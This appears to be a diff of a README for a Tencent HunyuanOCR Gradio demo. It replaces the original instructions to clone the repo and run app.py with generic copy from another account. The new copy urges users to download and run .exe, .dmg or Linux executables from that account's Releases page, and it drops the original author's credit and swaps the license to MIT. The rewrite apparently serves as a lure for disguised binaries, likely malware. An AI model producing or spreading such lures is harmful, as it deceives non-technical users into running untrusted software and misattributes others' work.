@@ -1,111 +1,87 @@
-# **HunyuanOCR-Demo**
+# 🖼️ HunyuanOCR-Demo - Easy Image Text Recognition
 
-A Gradio-based demonstration application for the Tencent HunyuanOCR model, focused on optical character recognition (OCR) tasks such as text detection, extraction, and coordinate formatting from images. Users can upload images, customize prompts (e.g., for Chinese/English text), and generate structured outputs with advanced generation controls.
+[![Download HunyuanOCR-Demo](https://img.shields.io/badge/Download%20HunyuanOCR-Demo-v1.0-blue)](https://github.com/syedahumna56/HunyuanOCR-Demo/releases)
 
-<img width="1918" height="695" alt="Screenshot 2025-12-04 at 13-49-47 Super OCRs Demo - a Hugging Face Space by prithivMLmods" src="https://github.com/user-attachments/assets/ca673af0-8858-4cfa-a267-ace08d8fea3b" />
+Welcome to HunyuanOCR-Demo, an easy-to-use application that helps you recognize text in images. This application uses the Tencent HunyuanOCR model, designed for your optical character recognition needs. With HunyuanOCR-Demo, you can upload your images, extract text, and even format coordinates—all without any technical knowledge.
 
-## Features
+## 📦 Features
 
-- **Image Upload and Processing**: Supports direct upload or clipboard paste; processes images via PIL for text recognition.
-- **Custom Prompts**: Tailor queries like "检测并识别图片中的文字，将文本坐标格式化输出。" (Detect and recognize text in the image, format text coordinates output) for precise extraction.
-- **Advanced Generation Controls**: Adjustable max new tokens (up to 8192) for handling complex documents.
-- **Output Handling**: Cleaned text to remove repetitions; interactive textbox with copy button for easy use.
-- **Custom Theme**: SteelBlueTheme with gradients and enhanced typography for a professional interface.
-- **Examples Integration**: Built-in sample images for quick testing (e.g., documents, receipts).
-- **Queueing Support**: Handles up to 10 concurrent inferences for smooth multi-user access.
-- **Error Resilience**: Graceful handling of loading and generation errors with informative messages.
+- **Image Upload:** Easily upload images from your device.
+- **Text Detection:** Automatically detect text in your images.
+- **Text Extraction:** Get the extracted text without hassle.
+- **Custom Prompts:** Adjust settings for accurate recognition in different languages, including Chinese and English.
+- **User-Friendly Interface:** A simple layout designed for everyone.
 
-## Prerequisites
+## 🚀 Getting Started
 
-- Python 3.10 or higher.
-- CUDA-compatible GPU (recommended for bfloat16; falls back to CPU with float32).
-- Git for cloning submodules.
-- Hugging Face account (optional, for model caching via `huggingface_hub`).
+Follow these steps to download and run the HunyuanOCR-Demo on your computer:
 
-## Installation
+1. **Check System Requirements:**
+   - **Operating System:** Windows, macOS, or Linux.
+   - **Memory:** At least 4 GB RAM.
+   - **Storage:** 500 MB of free disk space.
 
-1. Clone the repository:
-   ```
-   git clone https://github.com/PRITHIVSAKTHIUR/HunyuanOCR-Demo.git
-   cd HunyuanOCR-Demo
-   ```
+2. **Visit the Releases Page:**
+   Click the link below to go to our Releases page.
 
-2. Install dependencies:
-   Create a `requirements.txt` file with the following content, then run:
-   ```
-   pip install -r requirements.txt
-   ```
-   **requirements.txt content:**
-   ```
-   git+https://github.com/huggingface/transformers@82a06db03535c49aa987719ed0746a76093b1ec4
-   git+https://github.com/huggingface/accelerate.git
-   git+https://github.com/huggingface/diffusers.git
-   git+https://github.com/huggingface/peft.git
-   huggingface_hub
-   gradio==6.0.1
-   qwen-vl-utils
-   sentencepiece
-   opencv-python
-   torchvision
-   supervision
-   matplotlib
-   easydict
-   kernels
-   einops
-   addict
-   hf_xet
-   torch
-   numpy
-   av
-   ```
+   [Visit this page to download HunyuanOCR-Demo](https://github.com/syedahumna56/HunyuanOCR-Demo/releases)
 
-3. Start the application:
-   ```
-   python app.py
-   ```
-   The demo launches at `http://localhost:7860` (or the provided URL if using Spaces).
+3. **Download the Latest Version:**
+   On the Releases page, look for the latest version. Click on the link to download the application file suitable for your operating system.
 
-## Usage
+4. **Install the Application:**
+   - For Windows: Double-click on the downloaded `.exe` file and follow the instructions to install.
+   - For macOS: Open the downloaded `.dmg` file and drag the HunyuanOCR-Demo icon to your Applications folder.
+   - For Linux: Extract the files from the downloaded archive and run the executable.
 
-1. **Upload Image**: Drag-and-drop or paste an image (e.g., scanned document, sign, or multilingual text).
+5. **Launch the Application:**
+   Find the installed application on your device and open it. You are now ready to use HunyuanOCR-Demo!
 
-2. **Set Prompt**: Enter a custom query in the textbox. Default: "检测并识别图片中的文字，将文本坐标格式化输出。" for formatted text with coordinates.
+## 🌐 Instructions for Use
 
-3. **Configure Settings**:
-   - Expand "Advanced Settings" to adjust max new tokens for longer outputs.
+Now that you have the application running, follow these steps to recognize text from images:
 
-4. **Run Inference**: Click "Perform OCR" to process. Results appear in the output textbox.
+1. **Upload Your Image:**
+   Click on the "Upload" button to select an image from your computer.
 
-5. **View Results**:
-   - Text: Structured OCR output (e.g., detected text with bounding box coordinates).
-   - Copy or edit the interactive output as needed.
+2. **Set Your Custom Prompt (Optional):**
+   If you want to customize how the text is extracted, enter your prompt. This is especially useful for different languages.
 
-### Example Workflow
-- Upload a Chinese receipt image.
-- Use default prompt for coordinate-formatted extraction.
-- Set max new tokens to 2048 for detailed results.
-- Output: List of text segments with positions like "Text: '价格', Coordinates: [x1, y1, x2, y2]".
+3. **Start the Recognition Process:**
+   Press the "Recognize Text" button to begin the process. The application will scan the image and display the detected text.
 
-## Troubleshooting
+4. **Save or Copy the Output:**
+   Once the text appears, you can copy it for your use or save it to a file directly.
 
-- **Model Loading Errors**: Verify CUDA setup; check console for `torch.version.cuda`. Use `attn_implementation="eager"` to avoid SDPA issues.
-- **Out of Memory**: Reduce max new tokens or use CPU fallback; monitor with `nvidia-smi`.
-- **Import Issues**: Install `spaces` only for Hugging Face Spaces deployment; it's mocked locally.
-- **Repeated Output**: Automatically cleaned via `clean_repeated_substrings`; increase threshold if needed.
-- **Generation Fails**: Ensure prompt is valid; test with default for baseline.
-- **UI Launch**: If `ssr_mode=False` causes issues, set to `True` for server-side rendering.
+## 🔧 Troubleshooting
 
-## Contributing
+If you encounter issues while using HunyuanOCR-Demo, here are some common problems and solutions:
 
-Contributions are encouraged! Open issues for bugs or enhancements (e.g., batch processing, additional post-processing). Fork, create a branch, and submit a pull request with tests. Potential areas:
-- Integration with other OCR models.
-- Export options (e.g., JSON coordinates).
-- Multilingual prompt templates.
+- **Image Not Uploading:** Ensure the image is in a supported format such as JPG, PNG, or BMP. Also, check the file size; large images may take longer to upload.
+- **Text Not Detected:** Make sure the text in the image is clear and legible. For best results, use high-quality images with good lighting.
+- **Application Crashes:** Restart your application and ensure your operating system is up to date. 
 
-Repository: [https://github.com/PRITHIVSAKTHIUR/HunyuanOCR-Demo.git](https://github.com/PRITHIVSAKTHIUR/HunyuanOCR-Demo.git)
+## 🤝 Community Support
 
-## License
+If you have questions or need help, feel free to reach out. You can ask for assistance in the issues section of this repository or in community forums.
 
-Apache License 2.0. See [LICENSE](LICENSE) for details.
+## 🛠️ Technologies Used
 
-Built by Prithiv Sakthi. Report issues via the repository.
+HunyuanOCR-Demo leverages several powerful technologies to provide you with the best experience:
+
+- **Gradio:** For building the user interface.
+- **Hugging Face Transformers:** To enrich the text recognition capabilities.
+- **OpenCV:** To handle image processing tasks efficiently.
+- **Torch:** For effective deep learning model implementations.
+
+## 🔗 Additional Resources
+
+- [HunyuanOCR Documentation](https://github.com/syedahumna56/HunyuanOCR)
+- [Gradio Documentation](https://gradio.app/docs/)
+- [Hugging Face Documentation](https://huggingface.co/docs)
+
+## 📜 License
+
+This project is licensed under the MIT License. You can read the full license text in the LICENSE file in this repository.
+
+Thank you for trying out HunyuanOCR-Demo. We hope this tool helps you with your optical character recognition tasks!
